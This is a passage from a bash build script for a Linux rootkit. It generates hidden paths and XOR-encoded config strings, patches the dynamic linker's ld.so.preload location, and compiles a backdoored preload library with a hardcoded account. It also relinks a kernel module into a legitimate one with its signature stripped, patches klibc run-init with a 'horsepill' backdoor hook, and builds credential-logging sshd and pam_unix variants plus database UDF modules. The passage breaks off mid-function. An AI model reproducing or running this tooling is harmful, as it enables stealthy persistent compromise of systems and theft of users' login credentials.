				printf $(shuf -n1 "${main_tmp}"/dlist)
			else
				eecho "No such dirs."
			fi
		;;
		"file")
			if [[ ! -s "${main_tmp}"/flist ]]; then
				find /{usr,var,lib}/ -not -path "/var/tmp/*" -name "*.so" -type f -printf '%f\n' 2>/dev/null|sort -u > "${main_tmp}"/flist
			fi
			if [[ -s "${main_tmp}"/flist ]]; then
				printf $(shuf -n1 "${main_tmp}"/flist)
			else
				eecho "No such files."
			fi
		;;
		"service")
			if [[ ! -s "${main_tmp}"/slist ]]; then
				if (( SYSTEMD == 1 )); then
					systemctl 2>/dev/null|grep -vi "ssh"|grep -i '\.service.*running'|awk '{print $1}'|while read -r l; do
						find /{lib,run,etc}/systemd/ ! -empty -type f -name "${l}"
					done|sort -u > "${main_tmp}"/slist
				elif (( SYSTEMD == 2 )); then
					service --status-all 2>/dev/null|grep -vi "ssh"|grep -i running|awk '{print $1}'|while read -r l; do
						grep -i "${l}" /etc/init.d/* /etc/rc.d/init.d/*
					done|awk -F: '{print $1}'|sort -u > "${main_tmp}"/slist
				fi
			fi
			if [[ -s "${main_tmp}"/slist ]]; then
				printf $(shuf -n1 "${main_tmp}"/slist)
			else
				eecho "No such services."
			fi
		;;
	esac
}

pre_gen(){
	local l procs
	if [[ -s "/etc/group" && -s "/etc/passwd" ]]; then
		if [[ ! -s "${main_tmp}"/ids ]]; then
			diff --changed-group-format='%<' --unchanged-group-format='' <(awk -F: '!($4)&&($3!=0){print $3}' /etc/group|while read -r l; do
				if (( l > 10 )); then
					grep -e 'sync$' -e 'nologin$' -e 'false$' -e ':/dev/' /etc/passwd|awk -F: '($4!=0){print $4}'|grep -wo "${l}"
				fi
			done|sort -u -n) <(find / -printf '%G\n' 2>/dev/null|sort -u -n) > "${main_tmp}"/ids
		fi
		if [[ -s "${main_tmp}"/ids ]]; then
			MGID="$(shuf "${main_tmp}"/ids -n 1)"
			MGID_NAME="$(grep :${MGID}: /etc/group|awk -F: '{print $1}')"
		else
			eecho "Couldn't find any needed group."
		fi
	else
		eecho "Couldn't find one of file [ /etc/passwd, /etc/group ]. Check it."
	fi
	procs="$(find /proc -maxdepth 1 -type f 2>/dev/null)"
	read -r -a proclist <<< ${procs[@]}
}

patch_lib(){
	if grep -q "$2" "$1"; then
		update_time "$1"
		xxd -p "$1"|tr -d '\n'|sed "s#$(printf "$2"|xxd -p)#$(printf "$3"|xxd -p)#g"|xxd -r -p > "$1".tmp
		chmod --reference "$1" "$1".tmp
		mv -f "$1".tmp "$1"
		update_time "$1"
	fi
}

patch_libdl(){
	local ldlibname
	necho "\t\tPatching dynamic linker libraries..."
	if [[ -s "${tmp_dir}"/.patch ]]; then
		LDSO_PRELOAD=$(cat "${tmp_dir}"/.patch 2>/dev/null)
		LDSO_OLD=$(cat "${LDSO_PRELOAD}" 2>/dev/null)
		rm -rf "${LDSO_OLD}" "${LDSO_PRELOAD}" &>/dev/null
	fi
	find /{lib,lib32,libx32,lib64}/ /lib/{x86_64-linux-gnu,i386-linux-gnu}/ /usr/{lib,lib32,libx32,lib64}/ -type f -name "ld-2*.so" -o -name "*ld-linux*.so" ! -type l 2>/dev/null|while read -r ldlibname; do
		patch_lib "${ldlibname}" "${LDSO_PRELOAD}" "${N_PRELOAD}"
	done
	(( $? != 0 )) && eecho "Nothing update."
	printf "${N_PRELOAD}" > "${tmp_dir}"/.patch
	secho "\t\tNew ld.so.preload location saved."
}

xenc(){
	local din ptr dout val1
	din="$1"
	for ((ptr=0; ptr<${#din}; ptr++)); do
		val1=0x$(xxd -l1 -p <<< "${din:ptr:1}")
		if (( (( val1 ^ XKEY )) == 0 )); then
			dout+=$(printf '\\\\x%02x' "${val1}")
		else
			dout+=$(printf '\\\\x%02x' "$((val1 ^ XKEY))")
		fi
	done
	echo -n "${dout}"
}

gen_func_name(){
	local COUNT PREADDED MIDADDED POSTADDED
	COUNT=$((RANDOM % 3 + 1))
	declare {PRE,MID,POST}ADDED=""
	if (( COUNT >= 1 )); then
		PREADDED="${ADDED[${RANDOM} % ${#ADDED[@]}]}"
		if (( COUNT >= 2 )); then
			MIDADDED="_${ADDED[${RANDOM} % ${#ADDED[@]}]}"
			if (( COUNT >= 3 )); then
				POSTADDED="_${ADDED[${RANDOM} % ${#ADDED[@]}]}"
			else
				POSTADDED="_$1"
			fi
		else
			MIDADDED="_$1"
		fi
	fi
	printf "${PREADDED}${MIDADDED}${POSTADDED}"
}

gen_vars(){
	local mods modlist c
	necho "\t\tGenerating variables..."
	while [[ -z "${XKEY}" || "${XKEY}" == "0x0"* || "${XKEY}" == "0xff" || "${XKEY}" == "0x20" ]]; do
		XKEY="0x$(openssl rand -hex 1)"
	done
	SSHD=""
	case $1 in
		"CLIENT")
			CLNT=0
			while [[ -z "${CLIENT}" || -f "${CLIENT}" ]]; do
				CLIENT_D=$(gen_f_d_p_s dir)
				CLIENT_F=$(gen_f_d_p_s file)
				CLIENT="${CLIENT_D}"/"${CLIENT_F}"
			done
			UUID="<UUID>"
		;;
		"LD")
			LD=0
			while [[ -z "${SOPATH}" || -f "${SOPATH}" ]]; do
				IDIR=$(gen_f_d_p_s dir)
				BDVLSO=$(gen_f_d_p_s file)
				SOPATH="${IDIR}"/"${BDVLSO}"
			done
			LDSO_PRELOAD=/etc/ld.so.preload
			N_PRELOAD=$(gen_f_d_p_s patch)
			CLEAN_PW=$(openssl rand -hex 10)
			BD_UNAME=$(openssl rand -hex 10)
			BD_SALT=$(openssl rand -base64 12|sed 's/+/\//g')
			BD_PWD=$(${main_tmp}/TOOLS/passgen "${CLEAN_PW}" "${BD_SALT}")
			(( $? != 0 )) && eecho 'Something wrong with [ passgen ].'
			BD_SSHPROCNAME="sshd: ${BD_UNAME}"
			while [[ -z "${LDSO_LOGS}" || -f "${LDSO_LOGS}" ]]; do
				LDSO_D=$(gen_f_d_p_s dir)
				LDSO_F=$(gen_f_d_p_s file)
				LDSO_LOGS="${LDSO_D}"/"${LDSO_F}"
			done
			while [[ -z "${HIDE_IP_PATH}" || -f "${HIDE_IP_PATH}" ]]; do
				HIDE_IP_D=$(gen_f_d_p_s dir)
				HIDE_IP_F=$(gen_f_d_p_s file)
				HIDE_IP_PATH="${HIDE_IP_D}"/"${HIDE_IP_F}"
			done
			PAM_IP="<IP>"
			PAM_HEX=$(printf '%02X' ${PAM_IP//./ } 2>/dev/null)
		;;
		"LKM")
			while [[ -z "${LKM_MOD}" || $(grep -i "${LKM_MOD}" /proc/modules) != "" ]]; do
				LKM_MOD=$(gen_func_name "${ADDED[${RANDOM} % ${#ADDED[@]}]}")
			done
			GIVEROOTPERM=$(openssl rand -hex 6)
			LDP=$(openssl rand -hex 6)
			PURGE=$(openssl rand -hex 6)
			while [[ -z "${PROC}" || -f "${N_P_N}" ]]; do
				P_N="${proclist[${RANDOM} % ${#proclist[@]}]}"
				PROCNAME=$(basename "${P_N}")
				NUM=$(shuf -i 1-$((${#PROCNAME}-2)) -n 1);
				PROC="${PROCNAME:0:${NUM}}"$(tr -dc '[:lower:]' <<< /dev/urandom|fold -w1|head -n1)"${PROCNAME:$((NUM+1)):${#PROCNAME}}"
				N_P_N=$(dirname "${P_N}")/"${PROC}"
			done
			C_C="printf '0 0 0 0'>/proc/sys/kernel/printk;printf 0>/proc/sys/kernel/hung_task_timeout_secs;sed -i 's/kernel.modules_disabled = .*/kernel.modules_disabled = 0/g' /etc/sysctl.conf /etc/sysctl.d/*;su -g ${MGID_NAME} -c 'if [[ ! -s ${SOPATH} || ! -s ${N_PRELOAD} ]];then printf ${LDP}>${N_P_N};cat ${N_P_N}>${SOPATH};printf ${SOPATH}>${N_PRELOAD};chown root.${MGID_NAME} ${N_PRELOAD} ${SOPATH};chmod 644 ${SOPATH} ${N_PRELOAD};fi'"
			C_C_C="${CLIENT} ${UUID}"
			ORIG_LKM_PATH=../LKM/"${LKM_MOD}".ko
		;;
		"LOADER")
			LKM=0
			while [[ -z ${LOADER_MOD} || $(grep -i "${LOADER_MOD}" /proc/modules) != "" ]]; do
				LOADER_MOD=$(gen_func_name "${ADDED[${RANDOM} % ${#ADDED[@]}]}")
			done
			mods=$(grep -P " 0 .*$" /proc/modules|awk '{print $1}'|while read -r l; do find /lib/modules/${VER} -type f -name "$(basename "$(modinfo -n ${l})")" 2>/dev/null|head -n1; done)
			read -r -a modlist <<< ${mods[@]}
			modlist=( $(shuf -e "${modlist[@]}") )
			c=0
			while [[ -z "${INIT_FUNC}" || -z "${init_addr}" || -z "${EXIT_FUNC}" || -z "${exit_addr}" ]]; do
				if (( c == ${#modlist[@]} )); then
					eecho "Libraries not found."
				fi
				MODPATH="${modlist[${c}],,}"
				IMODPATH=$(find "${init_folder}" -type f -name $(basename "${MODPATH}"|awk -F. '{print $1}')* 2>/dev/null|head -n1)
				if [[ ${IMODPATH} ]]; then
					FILETYPE=$(awk '{match($0,"[^.]+$",a)}END{print a[0]}' <<< "${MODPATH}")
					LOCAL="${NEW_MDIR}"/"$(basename "${MODPATH}")"
					if [[ "${FILETYPE}" =~ [kK][oO] ]]; then
						cp -f "${MODPATH}" "${LOCAL}" &>/dev/null
						(( $? != 0 )) && eecho "Couldn't copy [ ${MODPATH} ] to [ ${LOCAL} ]."
					else
						LOCAL="${LOCAL:0:${#LOCAL}-${#FILETYPE}-1}"
						case ${FILETYPE} in
							*[xX][zZ]*)
								xz -qcdf < "${MODPATH}" > "${LOCAL}" 2>/dev/null
							;;
							*[gG][zZ]*)
								gzip -qcdf < "${MODPATH}" > "${LOCAL}" 2>/dev/null
							;;
							*[bB][zZ]*)
								bzip2 -qcdf < "${MODPATH}" > "${LOCAL}" 2>/dev/null
							;;
							*[lL][zZ]*)
								lzma -qcdf < "${MODPATH}" > "${LOCAL}" 2>/dev/null
							;;
							*)
								eecho "Wrong module extension. Check [ ${MODPATH} ]."
							;;
						esac
						(( $? != 0 )) && eecho "Couldn't decompress [ ${MODPATH} ] using [ $1 ]."
					fi
					init_addr=$(objdump -t "${LOCAL}" 2>/dev/null|awk "/.init.text/ && /[^_]init_module/"'{print $5}')
					INIT_FUNC=$(objdump -t "${LOCAL}" 2>/dev/null|awk "/.init.text/"'{print $5" "$6}'|grep "${init_addr}"|awk '!/[^_]init_module/''{print $2}')
					exit_addr=$(objdump -t "${LOCAL}" 2>/dev/null|awk "/.exit.text/ && /[^_]cleanup_module/"'{print $5}')
					EXIT_FUNC=$(objdump -t "${LOCAL}" 2>/dev/null|awk "/.exit.text/"'{print $5" "$6}'|grep "${exit_addr}"|awk '!/[^_]cleanup_module/''{print $2}')
				fi
				(( c++ ))
			done
			objcopy --globalize-symbol="${INIT_FUNC}" --globalize-symbol="${EXIT_FUNC}" "${LOCAL}" &>/dev/null
			(( $? != 0 )) && eecho "Couldn't globalize symbols [ ${LOCAL} ]."
			objcopy --remove-section .note.module.sig "${LOCAL}" &>/dev/null
			(( $? != 0 )) && eecho "Couldn't remove sig [ ${LOCAL} ]."
			INIT_FUNC_NAME=$(gen_func_name "fexit")
			EXIT_FUNC_NAME=$(gen_func_name "finit")
			EKEY=0x"$(openssl rand -hex 4)" # 4bytes ????
			EFILE=$(shuf -n1 "${main_tmp}"/flist)
		;;
		"HORSEPILL")
			HP=0
			if (( HORSEPILL == 1 )); then
				CLIENT_BN=$(gen_func_name "${ADDED[${RANDOM} % ${#ADDED[@]}]}")
				SECTION_NAME=$(gen_func_name "${ADDED[${RANDOM} % ${#ADDED[@]}]}")
			else
				CLIENT_BN="<CLIENT_BN>"
				SECTION_NAME="<SECTION_NAME>"
			fi
		;;
		"SERVICE")
			SRV=0
			S_F_P=$(gen_f_d_p_s service)
			S_NAME=$(basename "${S_F_P}")
			if (( SYSTEMD == 1 )); then
				if [[ "${S_NAME}" =~ "service" ]]; then
					S_NAME_F=".$(echo ${S_NAME}|awk -F. '{print $NF}')"
					S_NAME=$(echo ${S_NAME}|awk 'BEGIN{FS=OFS="."}{NF--; print}')
				fi
			fi
			NUM=$(shuf -i 1-$((${#S_NAME}-2)) -n 1)
			NS_NAME="${S_NAME:0:${NUM}}"$(tr -dc '[:lower:]' <<< /dev/urandom|fold -w1|head -n1)"${S_NAME:$((NUM+1)):${#S_NAME}}"
			S_F_P_NS_NAME=$(dirname "${S_F_P}")/"${NS_NAME}""${S_NAME_F}"
		;;
		"SSHD")
			SSHD=0
			SSHD_LOGS=/var/tmp/.pw
			SSHD_SECKEY=$(openssl rand -hex 10)
			SSHD_BIN=$(command -v sshd)
			if [[ ! -s "${SSHD_BIN}" ]]; then
				eecho "Couldn't found ssh daemon."
			fi
		;;
		"PAM")
			PAM=0
			while [[ -z "${PAM_LOGS}" || -f "${PAM_LOGS}" ]]; do
				PAM_D=$(gen_f_d_p_s dir)
				PAM_F=$(gen_f_d_p_s file)
				PAM_LOGS="${PAM_D}"/"${PAM_F}"
			done
			PAM_KEY=$(openssl rand -hex 10)
		;;
		"MYSQL")
			MYSQL=0
			MYSQL_NAME=$(gen_func_name "${ADDED[${RANDOM} % ${#ADDED[@]}]}")
			if [[ -d /usr/include/mysql ]]; then
				MYSQL_I_DIR="/usr/include/mysql"
			elif [[ -d /usr/include/mariadb ]]; then
				MYSQL_I_DIR="/usr/include/mariadb"
			else
				wecho "\t\t\tCoulndn't found [ include ] directory."
			fi
			MYSQL_P_DIR=$(mysql -sN -e 'SELECT @@plugin_dir')
			if [[ "${MYSQL_P_DIR}" ]]; then
				while [[ -z "${MYSQL_SO}" || -f "${MYSQL_P_DIR}"/"${MYSQL_SO}" ]]; do
					MYSQL_SO=$(gen_f_d_p_s file)
				done
			else
				wecho "\t\t\tCouldn't found Plugin dir."
			fi
		;;
		"POSTGRES")
			POSTGRES=0
			POSTGRES_NAME=$(gen_func_name "${ADDED[${RANDOM} % ${#ADDED[@]}]}")
			P_VERS_TMP=$(psql -V|awk '{print $3}')
			P_F_VERS=$(echo ${P_VERS_TMP}|awk -F. '{print $1}')
			P_S_VERS=$(echo ${P_VERS_TMP}|awk -F. '{print $2}')
			if [[ -d /usr/include/postgresql/"${P_VERS_TMP}"/server ]]; then
				POSTGRES_I_DIR="/usr/include/postgresql/${P_VERS_TMP}/server"
			elif [[ -d /usr/include/postgresql/"${P_F_VERS}"/server ]]; then
				POSTGRES_I_DIR="/usr/include/postgresql/${P_F_VERS}/server"
			elif [[ -d /usr/include/pgsql/server ]]; then
				POSTGRES_I_DIR="/usr/include/pgsql/server"
			else
				wecho "\t\t\tCoulndn't found [ include ] directory."
			fi
			while [[ -z "${POSTGRES_SO}" || -f "${POSTGRES_SO}" ]]; do
				POSTGRES_D=$(gen_f_d_p_s dir)
				POSTGRES_F=$(gen_f_d_p_s file)
				POSTGRES_SO="${POSTGRES_D}"/"${POSTGRES_F}"
			done
		;;
	esac
	secho "\t\tGenerating complete."
}

build_char_array(){
	local nam arr carr asize e
	nam="$1"
	arr="$2"
	asize="#define ${nam^^}_SIZE $3"
	carr="\n${asize}\nstatic char *${nam}[${nam^^}_SIZE] = {"
	for e in ${arr[@]}; do
		carr+="\"$(xenc "${e}")\","
	done
	echo -n "${carr::${#carr}-1}};\n"
}

write_char_arrays(){
	local current_array array_name array_elements final_char_arrays current_hook split_array_elements i
	necho "\t\t\tBeginning the main user config wizard..."
	while read -r current_array; do
		IFS=: read -r array_name array_elements <<< ${current_array[@]}
		IFS=, read -r -a split_array_elements <<< ${array_elements[@]}
		final_char_arrays+="$(build_char_array "${array_name}" "${split_array_elements[*]}" ${#split_array_elements[*]})"
		if [[ ${array_name} != *"_calls"* ]]; then
			continue
		fi
		for current_hook in ${split_array_elements[@]}; do
			HOOKS+=("${current_hook}")
		done
	done < ./char_arrays
	final_char_arrays+="$(build_char_array all "${HOOKS[*]}" ${#HOOKS[*]})"
	for i in ${!HOOKS[@]}; do
		final_char_arrays+="#define C${HOOKS[i]^^} ${i}\n"
	done
	final_char_arrays+="syms symbols[ALL_SIZE];\n"
	printf "${final_char_arrays}\n" >> ./config.h
	secho "\t\t\tConfig wizard finished."
}

start_config_wizard(){
	local i
	necho "\t\tOverwriting variables..."
	cd "${NEW_MDIR}" 1>/dev/null
	case $1 in
		"LD")
			write_char_arrays
			for i in {"IDIR","BDVLSO","SOPATH","N_PRELOAD","BD_UNAME","BD_PWD","LDSO_LOGS","HIDE_IP_PATH","BD_SSHPROCNAME"}; do
				sed -i "s/%%${i}%%/$(xenc "${!i}")/g" ./config.h &>/dev/null
				(( $? != 0 )) && eecho "Couldn't replace [ ${i} ] in [ ${NEW_MDIR}/config.h ]."
			done
			for i in {"MGID","XKEY"}; do
				sed -i "s#%%${i}%%#${!i}#g" ./config.h &>/dev/null
				(( $? != 0 )) && eecho "Couldn't replace [ ${i} ] in [ ${NEW_MDIR}/config.h ]."
			done
		;;
		"LKM")
			for i in {"GIVEROOTPERM","LDP","PURGE","HIDE","PROC","C_C","C_C_C","LKM_MOD","MGID_NAME"}; do
				sed -i "s/%%${i}%%/$(xenc "${!i}")/g" ./config.h &>/dev/null
				(( $? != 0 )) && eecho "Couldn't replace [ ${i} ] in [ ${NEW_MDIR}/config.h ]."
			done
			for i in {"MGID","XKEY","LKM_MOD","VER"}; do
				sed -i "s#%%${i}%%#${!i}#g" ./config.h ./Makefile &>/dev/null
				(( $? != 0 )) && eecho "Couldn't replace [ ${i} ] in [ ${NEW_MDIR}/config.h || ${NEW_MDIR}/Makefile ]."
			done
			xxd -i ../LD/LD.so >> ./config.h
			(( $? != 0 )) && eecho "Couldn't find [ ${main_tmp}/LD/LD.so ]."
			sed -i "s/___LD_LD_so/LDPSO/g" ./config.h &>/dev/null
			(( $? != 0 )) && eecho "Couldn't replace [ ${i} ] in [ ${NEW_MDIR}/config.h ]."
		;;
		"LOADER")
			for i in {"INIT_FUNC","INIT_FUNC_NAME","EXIT_FUNC","EXIT_FUNC_NAME","EFILE","ORIG_LKM_PATH","EKEY","LOADER_MOD","VER"}; do
				sed -i "s#%%${i}%%#${!i}#g" ./LOADER.c ./Makefile
				(( $? != 0 )) && eecho "Couldn't replace [ ${i} ] in [ ${NEW_MDIR}/LOADER.c || ${NEW_MDIR}/Makefile ]."
			done
		;;
		"HORSEPILL")
			if (( HORSEPILL == 1 )); then
				apt-get -o Acquire::Check-Date=false -o Dir::Etc::SourceList=../sources.list -y source klibc &>/dev/null
				(( $? != 0 )) && {
					wecho "Something wrong with download or unpack source klibc."
					HORSEPILL=0
				} || {
					for i in {"CLIENT_BN","SECTION_NAME","UUID"}; do
						sed -i "s#%%${i}%%#${!i}#g" ./horsepill/horsepill.c
						(( $? != 0 )) && eecho "Couldn't replace [ ${i} ] in [ ${NEW_MDIR}/horsepill/horsepill.c ]."
					done
					if [[ -d ./klibc-"${KVER}" ]]; then
						cp -r ./klibc-"${KVER}" ./klibc-"${KVER}".orig &>/dev/null
						sed -i 's/runinitlib.o/runinitlib.o horsepill.o infect.o/g' ./klibc-"${KVER}"/usr/kinit/run-init/Kbuild
						(( $? != 0 )) && eecho "Couldn't replace [ ./klibc-${KVER}/usr/kinit/run-init/Kbuild ]."
						sed -i '0,/static int nuke[(]/s!static int nuke[(]!#include "horsepill.h"\nstatic int nuke(!' ./klibc-"${KVER}"/usr/kinit/run-init/runinitlib.c
						(( $? != 0 )) && eecho "Couldn't replace [ ./klibc-${KVER}/usr/kinit/run-init/runinitlib.c ]."
						if (( $(grep -c 'dry_run' ./klibc-"${KVER}"/usr/kinit/run-init/runinitlib.c) >= 1 )); then
							sed -i 's#safe\.\.\. \*\/#safe... */\n\tif(!dry_run \&\& should_backdoor()){\n\t\tif(grab_executable() < 0)\n\t\t\texit(EXIT_FAILURE);\n\t\tsleep(10);\n\t}#g' ./klibc-"${KVER}"/usr/kinit/run-init/runinitlib.c
							(( $? != 0 )) && eecho "Couldn't replace [ ./klibc-${KVER}/usr/kinit/run-init/runinitlib.c ]."
						else
							sed -i 's#safe\.\.\. \*\/#safe... */\n\tif(should_backdoor()){\n\t\tif(grab_executable() < 0)\n\t\t\texit(EXIT_FAILURE);\n\t\tsleep(10);\n\t}#g' ./klibc-"${KVER}"/usr/kinit/run-init/runinitlib.c
							(( $? != 0 )) && eecho "Couldn't replace [ ./klibc-${KVER}/usr/kinit/run-init/runinitlib.c ]."
						fi
						sed -i 's#execv[(]init#perform_hacks();\n\texecv(init#g' ./klibc-"${KVER}"/usr/kinit/run-init/runinitlib.c
						(( $? != 0 )) && eecho "Couldn't replace [ ./klibc-${KVER}/usr/kinit/run-init/runinitlib.c ]."
						cp -f ./horsepill/* ./klibc-"${KVER}"/usr/kinit/run-init/
						xxd -i ../CLIENT/CLIENT > ./klibc-"${KVER}"/usr/kinit/run-init/client.h
						(( $? != 0 )) && eecho "Couldn't find [ ../CLIENT/CLIENT ]."
						diff -Nuar klibc-"${KVER}".orig/ klibc-"${KVER}"/ > ./klibc-avahi.patch
						sed -i 's/___CLIENT_CLIENT/client/g' ./klibc-avahi.patch
						(( $? != 0 )) && eecho "Couldn't replace [ ./klibc-avahi.patch ]."
						cp -f ./klibc-avahi.patch ./klibc-"${KVER}".orig/debian/patches/
						printf 'klibc-avahi.patch\n' >> ./klibc-"${KVER}".orig/debian/patches/series
					else
						eecho "KLIBC was downloaded but folder not found. Check version."
					fi
				}
			fi
		;;
		"SERVICE")
			for i in {"MGID_NAME","NS_NAME","CLIENT","UUID"}; do
				sed -i "s#%%${i}%%#${!i}#g" ./*.service 2>/dev/null
				(( $? != 0 )) && eecho "Couldn't replace [ ${i} ] in [ ${NEW_MDIR}/*.service ]."
			done
		;;
		"SSHD")
			for i in {"SSHD_LOGS","SSHD_SECKEY","SSHD_NEWKEY"}; do
				sed -i "s#%%${i}%%#$(xenc "${!i}")#g" ./conf.h &>/dev/null
				(( $? != 0 )) && eecho "Couldn't replace [ ${i} ] in [ ${NEW_MDIR}/conf.h ]."
			done
			for i in {"MGID","XKEY"}; do
				sed -i "s#%%${i}%%#${!i}#g" ./conf.h &>/dev/null
				(( $? != 0 )) && eecho "Couldn't replace [ ${i} ] in [ ${NEW_MDIR}/conf.h ]."
			done
			autoheader &>/dev/null
			(( $? != 0 )) && eecho "Couldn't autoheader."
			autoconf &>/dev/null
			(( $? != 0 )) && eecho "Couldn't autoconf."
			necho "\t\t\tStarting configure..."
			./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-ipv4-default --with-md5-passwords --with-systemd &>/dev/null
			(( $? != 0 )) && eecho "Configuration error."
			secho "\t\t\tConfigured."
		;;
		"PAM")
			for i in {"PAM_KEY","PAM_LOGS"}; do
				sed -i "s#%%${i}%%#$(xenc "${!i}")#g" ./modules/pam_unix/pam_unix_auth.c &>/dev/null
				(( $? != 0 )) && eecho "Couldn't replace [ ${i} ] in [ ${NEW_MDIR}/modules/pam_unix/pam_unix_auth.c ]."
			done
			sed -i "s#%%XKEY%%#${XKEY}#g" ./modules/pam_unix/pam_unix_auth.c &>/dev/null
			(( $? != 0 )) && eecho "Couldn't replace [ XKEY ] in [ ${NEW_MDIR}/modules/pam_unix/pam_unix_auth.c ]."
			autoreconf -if &>/dev/null
			(( $? != 0 )) && eecho "Couldn't autoreconf."
			necho "\t\t\tStarting configure..."
			./configure &>/dev/null
			(( $? != 0 )) && eecho "Configuration error."
			secho "\t\t\tConfigured."
		;;
		"MYSQL")
			for i in {"MYSQL_NAME","MYSQL_I_DIR"}; do
				sed -i "s#%%${i}%%#${!i}#g" ./UDF.c ./Makefile &>/dev/null
				(( $? != 0 )) && eecho "Couldn't replace [ ${i} ] in [ ${NEW_MDIR}/UDF.c ]."
			done
		;;
		"POSTGRES")
			for i in {"POSTGRES_NAME","POSTGRES_I_DIR"}; do
				sed -i "s#%%${i}%%#${!i}#g" ./UDF.c ./Makefile &>/dev/null
				(( $? != 0 )) && eecho "Couldn't replace [ ${i} ] in [ ${NEW_MDIR}/UDF.c ]."
			done
		;;
	esac
	cd - 1>/dev/null
	secho "\t\tOverwriting complete."
}

compile(){
	necho "\t\tStarting compile..."
	case $1 in
		"LD")
			make -j"${PROC_NUM}" -C "${NEW_MDIR}" &>/dev/null
		;;
		"LKM")
			make -j"${PROC_NUM}" -C "${NEW_MDIR}" &>/dev/null
		;;
		"LOADER")
			make -i -j"${PROC_NUM}" -C "${NEW_MDIR}" &>/dev/null
		;;
		"HORSEPILL")
			if (( HORSEPILL == 1 )); then
				cd "${NEW_MDIR}"/klibc-"${KVER}".orig/ 1>/dev/null
					dpkg-buildpackage -j"${PROC_NUM}" -us -uc &>/dev/null
					(( $? != 0 )) && eecho "Couldn't dpkg-buildpackage."
				cd - 1>/dev/null
				cp -f "${NEW_MDIR}"/klibc-"${KVER}".orig/usr/kinit/run-init/static/run-init "${NEW_MDIR}"/ &>/dev/null
			fi
		;;
		"SSHD")
			make -j"${PROC_NUM}" -C "${NEW_MDIR}" "sshd" &>/dev/null
		;;
		"PAM")
			make -j"${PROC_NUM}" -C "${NEW_MDIR}"/libpam &>/dev/null
			(( $? != 0 )) && eecho "Compilation error [ ${NEW_MDIR}/libpam ]."
			make -j"${PROC_NUM}" -C "${NEW_MDIR}"/modules/pam_unix/ &>/dev/null
		;;
		"MYSQL")
			make -j"${PROC_NUM}" -C "${NEW_MDIR}" &>/dev/null
		;;
		"POSTGRES")
			make -j"${PROC_NUM}" -C "${NEW_MDIR}" &>/dev/null
		;;
	esac
	(( $? != 0 )) && eecho "Compilation error."
	secho "\t\tModule compiled."
}

sstrip(){
	necho "\t\tStart strip..."
	case $1 in
		"LD")
			strip -R .note -R .comment -s "${NEW_MDIR}"/"$1".so &>/dev/null
			if (( $(stat --printf="%s" "${NEW_MDIR}"/"$1".so) >= 65534 )); then
				eecho "Size of [ ${NEW_MDIR}/$1.so ] more then 65534 bytes."
			fi
		;;
		"LKM")
			strip -R .note.gnu.build-id -R .comment -R .buildid -g "${NEW_MDIR}"/"${LKM_MOD}".ko &>/dev/null
		;;
		"LOADER")
			strip -R .note.gnu.build-id -R .comment -R .buildid -R .modinfo -g "${NEW_MDIR}"/"${LOADER_MOD}".ko &>/dev/null
		;;
		"HORSEPILL")
			strip -s "${NEW_MDIR}"/run-init &>/dev/null
		;;
		"SSHD")
			strip -s "${NEW_MDIR}"/sshd &>/dev/null
		;;
		"PAM")
			strip -R .note -R .comment -s "${NEW_MDIR}"/modules/pam_unix/.libs/pam_unix.so &>/dev/null
		;;
		"MYSQL")
			strip -R .note -R .comment -s "${NEW_MDIR}"/UDF.so &>/dev/null
		;;
		"POSTGRES")
			strip -R .note -R .comment -s "${NEW_MDIR}"/UDF.so &>/dev/null
		;;
	esac
	(( $? != 0 )) && eecho "Couldn't strip library."
	secho "\t\tStrip complete."
}

build(){
	mv "${LOCAL}" "${LOCAL}".old
	(( $? != 0 )) && eecho "Couldn't move [ ${LOCAL} ] to [ ${LOCAL}.old ]."
	cp -f "${LOCAL}".old "${tmp_dir}"/module.ko
	(( $? != 0 )) && eecho "Couldn't copy [ ${LOCAL}.old ] to [ ${tmp_dir}/module.ko ]."
	necho "\t\tRelocating..."
	ld -r "${LOCAL}".old "${NEW_MDIR}"/"${LOADER_MOD}".ko -o "${LOCAL}"
	(( $? != 0 )) && eecho "Couldn't relocate module." || secho "\t\tRelocation success."
	new_init_addr=$(objdump -t "${LOCAL}" 2>/dev/null|awk "/.init.text/ && /${INIT_FUNC_NAME}/"'{print $1}')
	new_exit_addr=$(objdump -t "${LOCAL}" 2>/dev/null|awk "/.exit.text/ && /${EXIT_FUNC_NAME}/"'{print $1}')
	if [[ -z ${new_init_addr} || -z ${new_exit_addr} ]]; then
		eecho "Not found ${new_init_addr} || ${new_exit_addr}"
	fi
	"${main_tmp}"/TOOLS/elfchngr -s init_module -v "${new_init_addr}" "${LOCAL}" 1>/dev/null;
	(( $? != 0 )) && eecho "Couldn't change (${INIT_FUNC_NAME}[${new_init_addr}]) [ ${LOCAL} ] library." || secho "\t\tNew init_module function module (${INIT_FUNC_NAME}[${new_init_addr}]) was replaced."
	"${main_tmp}"/TOOLS/elfchngr -s cleanup_module -v "${new_exit_addr}" "${LOCAL}" 1>/dev/null
	(( $? != 0 )) && eecho "Couldn't change (${EXIT_FUNC_NAME}[${new_exit_addr}]) [ ${LOCAL} ] library." || secho "\t\tNew cleanup_module function module (${EXIT_FUNC_NAME}[${new_exit_addr}]) was replaced."
	strip -g "${LOCAL}"
	(( $? != 0 )) && eecho "Couldn't strip [ ${LOCAL} ] library." || secho "\t\tLibrary [ ${LOCAL} ] strip debug symbols success."
}

gen(){
	NEW_MDIR="${main_tmp}"/"$1"
	rm -rf "${NEW_MDIR}"
	techo "\tStart creating $1 module..."
	cp -r "${main_src}"/"$1" "${NEW_MDIR}" &>/dev/null
	(( $? != 0 )) && eecho "Couldn't copy module directory."
	gen_vars "$1"
	start_config_wizard "$1"
	compile "$1"
	sstrip "$1"
	if [[ "$1" == "LOADER" ]]; then
		build
	fi
	techo "\t$1 module created."
}

compile_tools(){
	local i
	for i in ${TOOLS[*]}; do
		gcc "${main_src}"/TOOLS/"${i}".c -lcrypt -o "${main_tmp}"/TOOLS/"${i}" &>/dev/null
		(( $? != 0 )) && eecho "Compilation [ ${i} ] error."
		strip -s "${main_tmp}"/TOOLS/"${i}" &>/dev/null
		(( $? != 0 )) && eecho "Couldn't strip binary [ ${i} ]."
	done
}

create_boot(){
	necho "\t\tCreating new [ ${init_file} ] using [ $1 ] method."
	cd "${init_folder}" 1>/dev/null
	case $1 in
		"GENKERNEL")
			genkernel --install --no-ramdisk-modules initramfs
		;;
		"DRACUT")
			dracut --early-microcode -f "${init_file}" "${VER}" &>/dev/null
		;;
		"MKINITRAMFS")
			mkinitramfs -o "${init_file}" &>/dev/null
		;;
		"MKINITCPIO")
			mkinitcpio -p linux &>/dev/null
		;;
		"MKINITRD")
